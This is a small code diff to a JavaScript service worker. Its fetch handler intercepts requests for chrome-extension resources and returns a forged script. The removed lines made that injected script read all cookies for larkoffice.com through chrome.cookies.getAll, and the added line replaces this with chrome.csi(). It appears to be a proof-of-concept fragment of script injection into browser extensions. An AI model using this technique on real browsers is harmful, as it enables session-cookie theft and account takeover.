@@ -6,8 +6,7 @@ self.addEventListener("fetch", (event) => {
     }
     if(event.request.url.indexOf("chrome-extension") != -1){
         var a =             new Response(`(async function foo() {
-                chrome.cookies.getAll({ domain: "larkoffice.com" }, (cookies) => {
-                console.log(cookies);
+                chrome.csi()
             });
           })();`, {
           headers: {'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin':"*"}
